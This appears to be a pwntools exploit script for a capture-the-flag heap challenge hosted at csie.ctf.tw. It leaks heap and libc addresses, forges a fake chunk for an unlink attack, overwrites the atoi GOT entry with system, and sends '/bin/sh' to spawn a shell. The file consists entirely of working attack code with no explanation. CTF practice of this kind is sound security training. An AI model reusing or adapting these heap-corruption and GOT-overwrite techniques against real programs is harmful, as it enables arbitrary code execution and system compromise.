from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
host = 'csie.ctf.tw'
port = 10140
r = remote(host, port)

# input('Enter')
sleep(0.1)

def add_profile(name=p64(0x1), age=0x1111, len_desc=0x90, desc=p64(0x1111111111111111)):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':') # name
    payload = name.ljust(0x10, b'\x00') + str(age).encode()
    r.sendline(payload)
    r.recvuntil(':') # age
    r.recvuntil(':') # len_desc
    r.sendline(str(len_desc).encode())
    r.recvuntil(':') # desc
    r.send(desc.ljust(len_desc-1, b'\x00')[:len_desc-1])

def show_profile(idx):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

def edit_profile(idx, name=p64(0x1), age=0x1111, desc=p64(0x1111111111111111)):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':') # idx
    r.sendline(str(idx).encode())
    r.recvuntil(':') # name
    payload = name.ljust(0x10, b'\x00') + str(age).encode()
    r.sendline(payload)
    r.recvuntil(':') # age
    r.recvuntil(':') # desc
    r.send(desc)

def edit_profile_free_name(idx):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(idx).encode())
    r.recvuntil(':')
    r.sendline(b'\x00')
    r.recvuntil('Realloc Error !')

def delete_profile(idx):
    r.recvuntil(':')
    r.sendline(b'4')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

profile = 0x602100

add_profile() # 0
add_profile(len_desc=0x92, desc=p64(0x1111111111111111)*18+p64(0x11)[:1]) # 1
edit_profile_free_name(0)
edit_profile_free_name(1)

# leak heap
edit_profile(1, name=p64(0xff)) # so that it can be printed by %s
show_profile(1)
r.recvuntil('Name : ')
heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00')) - 0xff
print('heap:', hex(heap))
r.recvuntil('Desc : ')
r.recvuntil('\n')

# prepare new malloc position
edit_profile(1, name=p64(heap+0x178), desc=p64(0x1111111111111111)*18+p64(0x20)[:1])
add_profile() # 2
add_profile(name=p64(0xa0)) # 3

# edit fake_chunk
fake_chunk = flat([0x30, 0x90, profile+0x28-0x18, profile+0x28-0x10] + [0x0]*14)
fake_chunk += p64(0x90)[:1]
edit_profile(1, desc=fake_chunk)

delete_profile(2)

# leak system
atoi_got = 0x602098
atoi_off = 0x36e80
edit_profile(1, desc=p64(atoi_got)[:4])
show_profile(0)
r.recvuntil('Desc : ')
atoi = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
print('atoi:', hex(atoi))
libc = atoi - atoi_off
system = libc + 0x45390
print('system:', hex(system))

# overwrite atoi_got & get shell
edit_profile(0, desc=p64(system)[:6])
r.recvuntil(':')
r.sendline(b'/bin/sh')

r.interactive()
